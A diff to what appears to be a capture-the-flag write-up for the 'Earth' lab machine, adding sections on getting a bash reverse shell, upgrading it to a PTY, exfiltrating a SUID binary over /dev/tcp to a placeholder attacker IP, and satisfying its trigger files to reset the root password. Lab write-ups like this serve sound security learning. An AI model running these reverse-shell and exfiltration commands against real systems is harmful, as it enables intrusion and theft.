@@ -173,25 +173,180 @@ The command revealed the location of `flag.txt`, which was successfully accessed
 
 ---
 
+---
+
+## Reverse Shell
+
+The administrative command interface only allowed one command to be executed at a time, making further enumeration inefficient. To obtain a more practical shell, a Bash reverse shell was executed, while a Netcat listener was configured on the attacker machine to receive the incoming connection.
+
+**Attacker**
+
+```bash
+nc -nlvp 10000
+```
+
+**Victim**
+
+```bash
+bash -i >& /dev/tcp/<ATTACKER-IP>/10000 0>&1
+```
+
+This established a remote shell from the target machine back to the attacker, allowing commands to be executed directly from the Kali terminal.
+
+---
+
+## Shell Upgrade
+
+Although the reverse shell provided command execution, it was not attached to a proper terminal (TTY), limiting interaction with several Linux utilities.
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/sh')"
+```
+
+Spawning a pseudo-terminal (PTY) improved shell usability by providing a more interactive environment for enumeration and privilege escalation activities.
+
+---
+
 ## Privilege Escalation
 
-Privilege escalation is currently in progress.
+Privilege escalation began by enumerating executables with the SUID permission set.
 
-The next objective is to enumerate the target further, identify privilege escalation vectors, and obtain root access.
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
 
-This section will be updated upon completion of the assessment.
+This command searches the filesystem for files that execute with the permissions of their owner while suppressing permission-related errors. During enumeration, a custom SUID binary named `reset_root` was identified, making it the primary target for further investigation.
+
+---
+
+## Binary Analysis
+
+To analyze the custom SUID binary more effectively, it was transferred from the victim machine to the attacker machine using Netcat.
+
+**Attacker**
+
+```bash
+nc -nlvp 443 > reset_root
+```
+
+**Victim**
+
+```bash
+cat /path/to/reset_root > /dev/tcp/<ATTACKER-IP>/443
+```
+
+The binary was then inspected locally using common Linux analysis tools.
+
+```bash
+strings reset_root
+chmod +x reset_root
+ltrace ./reset_root
+```
+
+Static and dynamic analysis revealed that the binary checked for the existence of three specific trigger files before performing its privileged operation.
+
+---
+
+## Trigger Discovery
+
+The `ltrace` output revealed the following required trigger files:
+
+```text
+/dev/shm/kHgTFI5G
+/dev/shm/Zw7bV9U5
+/tmp/kcM0Wewe
+```
+
+Since these files did not exist on the target system, the program terminated without performing any privileged action. This indicated that satisfying these checks was required before the binary would continue execution.
+
+---
+
+## Root Access
+
+The required trigger files were created on the victim machine.
+
+```bash
+touch /dev/shm/kHgTFI5G
+touch /dev/shm/Zw7bV9U5
+touch /tmp/kcM0Wewe
+```
+
+Executing the SUID binary again successfully reset the root password.
+
+```bash
+reset_root
+```
+
+The output confirmed:
+
+```text
+RESET TRIGGERS PRESENT.
+RESETTING ROOT PASSWORD TO: Earth
+```
+
+The root account was then accessed using:
+
+```bash
+su root
+```
+
+Entering the newly assigned password granted root privileges.
+
+Verification:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+---
+
+## Root Flag
+
+After obtaining root privileges, the root directory became accessible.
+
+```bash
+cd /root
+cat flag.txt
+```
+
+Reading the root flag confirmed successful completion of the Earth machine and full system compromise.
 
 ---
 
 ## Lessons Learned
 
-* ARP scanning is an effective method for identifying live hosts within a local Layer 2 network.
-* MAC address vendor prefixes can help distinguish virtual machines from physical hosts.
-* SSL certificate information may reveal additional virtual hostnames.
-* Directory enumeration can expose sensitive files not linked from the main application.
-* Information disclosure files often provide valuable clues regarding usernames, encryption methods, and application functionality.
-* CyberChef is an effective tool for decoding and analyzing encoded application data.
-* Correlating information gathered from multiple enumeration techniques can lead to successful credential recovery.
+* SSL certificates can reveal hidden virtual hosts that are not immediately accessible via IP address.
+* Information disclosure files may expose usernames, encryption methods, and other sensitive implementation details.
+* Correlating clues from multiple enumeration techniques can lead to successful credential recovery.
+* Upgrading a reverse shell to a PTY significantly improves usability during post-exploitation.
+* Enumerating SUID binaries is an essential privilege escalation technique on Linux systems.
+* Static and dynamic binary analysis can reveal hidden program logic and privilege escalation paths.
+* Reverse engineering custom binaries can expose application-specific mechanisms that lead to root access.
+
+---
+
+## Tools Used
+
+* arp-scan
+* Nmap
+* DIRB
+* CyberChef
+* Firefox
+* Netcat
+* Bash
+* Python 3
+* `find`
+* `touch`
+* `strings`
+* `ltrace`
+* OpenSSH
+* Linux CLI Utilities
 
 ---
 
@@ -202,6 +357,11 @@ This section will be updated upon completion of the assessment.
 * CyberChef
 * Nmap
 * DIRB
+* Netcat
+* GNU Bash
+* Python PTY Module
+* ltrace
+* GNU Binutils (`strings`)
 
 ---
 
